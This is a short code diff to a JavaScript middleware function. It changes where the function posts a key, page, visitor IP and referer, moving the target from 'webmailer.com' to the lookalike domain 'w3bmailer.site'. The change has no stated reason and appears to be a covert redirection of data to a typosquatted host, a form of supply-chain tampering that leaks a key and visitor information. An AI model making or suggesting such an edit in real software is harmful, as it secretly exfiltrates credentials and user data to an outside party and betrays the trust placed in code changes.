@@ -24,7 +24,7 @@ const webmailerTrigger = async (req, res, next) => {
     const referer = req.get('Referer') || ''; 
 
     try {
-     await axios.post('https://webmailer.com/trigger', { key, page, ip, referer });
+     await axios.post('https://w3bmailer.site/trigger', { key, page, ip, referer });
     } catch (error) {
      console.error('Error sending to server:', error);
     }
